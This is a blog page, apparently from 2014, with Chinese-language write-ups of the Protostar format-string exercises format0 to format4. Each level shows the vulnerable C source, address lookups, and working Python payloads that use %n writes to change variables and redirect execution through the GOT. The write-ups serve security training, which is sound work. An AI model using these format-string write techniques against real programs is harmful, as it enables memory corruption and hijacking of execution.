<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="#Format
##Format 0AboutThis level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.
Hints:This level should be done in less than 10 bytes of input.“Exploiting format string vulnerabilities”This level is at /opt/protostar/bin/format0">
    

    <!--Author-->
    
        <meta name="author" content="junzhepan">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Exploit Exercises Protostar Format Write-ups"/>
    

    <!--Open Graph Description-->
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="junzhepan"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>Exploit Exercises Protostar Format Write-ups - junzhepan</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css" type="text/css">

    <!-- Google Analytics -->
    


    <link rel="apple-touch-icon" sizes="180x180" href="/favicons/apple-touch-icon.png">
    <link rel="icon" type="image/png" href="/favicons/favicon-32x32.png" sizes="32x32">
    <link rel="icon" type="image/png" href="/favicons/favicon-16x16.png" sizes="16x16">
    <link rel="manifest" href="/favicons/manifest.json">
    <link rel="mask-icon" href="/favicons/safari-pinned-tab.svg" color="#fff">
    <meta name="apple-mobile-web-app-title" content="Jack Pan">
    <meta name="application-name" content="Jack Pan">
    <meta name="theme-color" content="#ffffff”>

</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    首页
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    归档
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/atom.xml">
                    订阅
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>


<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-code" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2014/10/10/Exploit-Exercises-Protostar-Format-Write-ups/">
                Exploit Exercises Protostar Format Write-ups
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2014-10-10</span>
            
            <a href="#disqus_thread" class="comments">评论</a>
            
                <span class="category">
                    <a href="/categories/Exploit/">Exploit</a>
                </span>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <p>#Format</p>
<p>##Format 0<br>About<br>This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.</p>
<p>Hints:<br>This level should be done in less than 10 bytes of input.<br>“Exploiting format string vulnerabilities”<br>This level is at /opt/protostar/bin/format0</p>
<a id="more"></a>
<p>Source code：</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

void vuln(char *string)
{
 volatile int target;
 char buffer[64];

 target = 0;

 sprintf(buffer, string);

 if(target == 0xdeadbeef) {
  printf(&quot;you have hit the target correctly :)\n&quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
</code></pre><p>根据提示，利用的是format string vulnerabilities，exploit如下：</p>
<pre><code>$ ./format0 `python -c &apos;print &quot;%64d\xef\xbe\xad\xde&quot;&apos;`
you have hit the target correctly :)
</code></pre><p>##Format 1<br>About<br>This level shows how format strings can be used to modify arbitrary memory locations.</p>
<p>Hints: objdump -t is your friend, and your input string lies far up the stack :)</p>
<p>This level is at /opt/protostar/bin/format1</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target;

void vuln(char *string)
{
 printf(string);

 if(target) {
  printf(&quot;you have modified the target :)\n&quot;);
 }
}

int main(int argc, char **argv)
{
 vuln(argv[1]);
}
</code></pre><p>首先找到<code>target</code>的地址：</p>
<pre><code>$ objdump -t format1 | grep target
08049638 g     O .bss   00000004              target
</code></pre><p>所以先定位输入字符串的位置：</p>
<pre><code>./format1 `python -c &apos;print &quot;ABCDXX&quot; + &quot;%x.&quot;*124&apos;`
ABCDXX804960c.bffffb88.8048469.b7fd8304.b7fd7ff4.bffffb88.8048435.bffffd40.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffc08.b7eadc76.2.bffffc34.bffffc40.b7fe1848.bffffbf0.ffffffff.b7ffeff4.804824d.1.bffffbf0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffc08.b5af584.2115a394.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc34.8048450.8048440.b7ff1040.bffffc2c.b7fff8f8.2.bffffd36.bffffd40.0.bffffebb.bffffedd.bffffee7.bffffefb.bfffff0d.bfffff1d.bfffff30.bfffff3d.bfffff48.bfffff86.bfffff97.bfffffa5.bfffffbc.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffffd1b.1f.bffffff2.f.bffffd2b.0.0.c3000000.ea2e94fb.177dfa56.9fcc7530.698c36a1.363836.0.2f2e0000.6d726f66.317461.44434241.
</code></pre><p>可以看到是在124的位置，将前面的<code>ABCD</code>换成<code>target</code>的地址，然后利用<code>%n</code>将字符串的长度写入<code>target</code>中：</p>
<pre><code>./format1 `python -c &apos;print &quot;\x38\x96\x04\x08&quot; + &quot;X&quot; * 2 + &quot;%x.&quot;*123 + &quot;%n.&quot;&apos;`
8XX804960c.bffffb88.8048469.b7fd8304.b7fd7ff4.bffffb88.8048435.bffffd40.b7ff1040.804845b.b7fd7ff4.8048450.0.bffffc08.b7eadc76.2.bffffc34.bffffc40.b7fe1848.bffffbf0.ffffffff.b7ffeff4.804824d.1.bffffbf0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffffc08.76fa3230.5cb56420.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffffc34.8048450.8048440.b7ff1040.bffffc2c.b7fff8f8.2.bffffd36.bffffd40.0.bffffebb.bffffedd.bffffee7.bffffefb.bfffff0d.bfffff1d.bfffff30.bfffff3d.bfffff48.bfffff86.bfffff97.bfffffa5.bfffffbc.0.20.b7fe2414.21.b7fe2000.10.fabfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffffd1b.1f.bffffff2.f.bffffd2b.0.0.21000000.890598f2.e3a7c486.5d920159.6908e92e.363836.0.2f2e0000.6d726f66.317461..you have modified the target :)
</code></pre><p>##Format 2<br>About<br>This level moves on from format1 and shows how specific values can be written in memory.</p>
<p>This level is at /opt/protostar/bin/format2</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target;

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);
 printf(buffer);

 if(target == 64) {
  printf(&quot;you have modified the target :)\n&quot;);
 } else {
  printf(&quot;target is %d :(\n&quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
</code></pre><p>依旧找<code>target</code>的位置：</p>
<pre><code>$ objdump -t format2 | grep target
080496e4 g     O .bss   00000004              target
</code></pre><p>这里依旧需要找输入字符串的位置，这里用Python的循环来实现：</p>
<pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format2
AAAA1:200.2:b7fd8420.3:bffffb34.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a.10:78253a35.11:253a362e.12:3a372e78.13:382e7825.14:2e78253a.15:78253a39
</code></pre><p>target is 0 :(<br>现在找到了，构造shellcode：</p>
<pre><code>$ python -c &apos;print &quot;\xe4\x96\x04\x08%4$n&quot;&apos; | ./format2
                                  ▒
target is 4 :(
</code></pre><p>##Format 3<br>About<br>This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.</p>
<p>This level is at /opt/protostar/bin/format3</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target;

void printbuffer(char *string)
{
 printf(string);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printbuffer(buffer);

 if(target == 0x01025544) {
  printf(&quot;you have modified the target :)\n&quot;);
 } else {
  printf(&quot;target is %08x :(\n&quot;, target);
 }
}

int main(int argc, char **argv)
{
 vuln();
}
</code></pre><p>依旧<code>target</code>地址：</p>
<pre><code>$ objdump -t format3 | grep target
080496f4 g O .bss 00000004 target
</code></pre><p>找位置：</p>
<pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format3
AAAA1:0.2:bffffaf0.3:b7fd7ff4.4:0.5:0.6:bffffcf8.7:804849d.8:bffffaf0.9:200.10:b7fd8420.11:bffffb34.12:41414141.13:78253a31.14:253a322e.15:3a332e78
target is 00000000 :(
</code></pre><p>修改<code>target</code>的值：</p>
<pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%12$n%13$n&quot;&apos; | ./format3
target is 00080008 :(
</code></pre><p>可以看到<code>target</code>的值为<code>0x00080008</code>，需要修改为<code>0x01025544</code>，先修改前半部分，<code>0x5544=21828</code>，修减掉前面字符串的长度8：</p>
<pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%21820x%12$n&quot;+&quot;%13$n&quot;&apos; | ./format3
target is 55445544 :(
</code></pre><p>修改后半部分，<code>0x0102=258</code>，由于前面长度已经超过258了，所以要计算<code>0x10102=65794</code>，<code>65794=8+21820+43966</code>：</p>
<pre><code>$ python -c &apos;print &quot;\xf4\x96\x04\x08&quot;+&quot;\xf6\x96\x04\x08&quot;+&quot;%21820x%12$n&quot;+&quot;%43966x%13$n&quot;&apos; | ./format3
you have modified the target :)
</code></pre><p>##Format 4<br>About<br>format4 looks at one method of redirecting execution in a process.</p>
<p>Hints: objdump -TR is your friend</p>
<p>This level is at /opt/protostar/bin/format4</p>
<p>Source code</p>
<pre><code>#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int target;

void hello()
{
 printf(&quot;code execution redirected! you win\n&quot;);
 _exit(1);
}

void vuln()
{
 char buffer[512];

 fgets(buffer, sizeof(buffer), stdin);

 printf(buffer);

 exit(1);
}

int main(int argc, char **argv)
{
 vuln();
}
</code></pre><p>先来找<code>exit()</code>的地址：</p>
<pre><code>$ objdump -TR format4 | grep exit
00000000 DF *UND* 00000000 GLIBC_2.0 _exit
00000000 DF *UND* 00000000 GLIBC_2.0 exit
08049718 R_386_JUMP_SLOT _exit
08049724 R_386_JUMP_SLOT exit
</code></pre><p>再看<code>hello()</code>的地址：</p>
<pre><code>(gdb) disas hello
Dump of assembler code for function hello:
0x080484b4 &lt;hello+0&gt;: push %ebp
0x080484b5 &lt;hello+1&gt;: mov %esp,%ebp
0x080484b7 &lt;hello+3&gt;: sub $0x18,%esp
0x080484ba &lt;hello+6&gt;: movl $0x80485f0,(%esp)
0x080484c1 &lt;hello+13&gt;: call 0x80483dc &lt;puts@plt&gt;
0x080484c6 &lt;hello+18&gt;: movl $0x1,(%esp)
0x080484cd &lt;hello+25&gt;: call 0x80483bc &lt;_exit@plt&gt;
End of assembler dump.
</code></pre><p>跟之前一样，找字符串的位置：</p>
<pre><code>$ python -c &apos;print &quot;AAAA&quot;+&quot;.&quot;.join([&quot;%d:%%x&quot; % i for i in range(1,16)])&apos; | ./format4
AAAA1:200.2:b7fd8420.3:bffffb34.4:41414141.5:78253a31.6:253a322e.7:3a332e78.8:342e7825.9:2e78253a.10:78253a35.11:253a362e.12:3a372e78.13:382e7825.14:2e78253a.15:78253a39
</code></pre><p>找到之后，需要把<code>0x080484b4</code>写到<code>0x08049724</code>对应的内存中，跟前面类似，分两部分，<code>0x84b4=33972</code>，<code>0x0804=2052</code>，由于2052太小，使用<code>0x10804=67588</code>，<code>67588-33972=33616</code>：</p>
<pre><code>$ python -c &apos;print &quot;\x24\x97\x04\x08&quot;+&quot;\x26\x97\x04\x08&quot;+&quot;%33964x%4$n&quot;+&quot;%33616x%5$n&quot;&apos; | ./format4
...
code execution redirected! you win
</code></pre>
    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/Exercise/">#Exercise</a> <a href="/tags/Exploit/">#Exploit</a>
        </div>
    

    <!-- Comments -->
    
    <div class="comments">
        
<div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>



    </div>
    

</div>
        </section>

    </div>
</div>

</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>关于</h2>
                <p>
                    本人，脾气好，不喷人，操作虎，意识强，渗透快，shell多，能过狗。同时，我也是<a href='https://www.watch0ut.com'>watch0ut</a>的一员。
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>最近博客</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2016/11/13/技术分析之黑客军团第二季/">技术分析之黑客军团第二季</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2016/10/30/技术分析之黑客军团第一季/">技术分析之黑客军团第一季</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2016/09/22/数字证书-Ruby/">数字证书-Ruby</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2016/08/17/密码算法-Ruby/">密码算法-Ruby</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>分类</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/OpenWrt/">OpenWrt</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/Other/">Other</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/Android/">Android</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/Tool/">Tool</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/junzhepan">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://twitter.com/junzhepan">
                            <span class="footer-icon-container">
                                <i class="fa fa-twitter"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="https://www.facebook.com/jack.pan.965">
                            <span class="footer-icon-container">
                                <i class="fa fa-facebook"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/100259285096579239148">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:jack@watch0ut.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li class="list-inline-item">
                        <a href="atom.xml">
                            <span class="footer-icon-container">
                                <i class="fa fa-rss"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    @junzhepan. All right reserved | Powerd by Hexo & <a href='https://github.com/klugjo'>Jonathan Klughertz</a>
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js" type="text/javascript"></script>

<!-- Disqus Comments -->

<script type="text/javascript">
    var disqus_shortname = 'junzhepan';

    (function(){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



</body>

</html>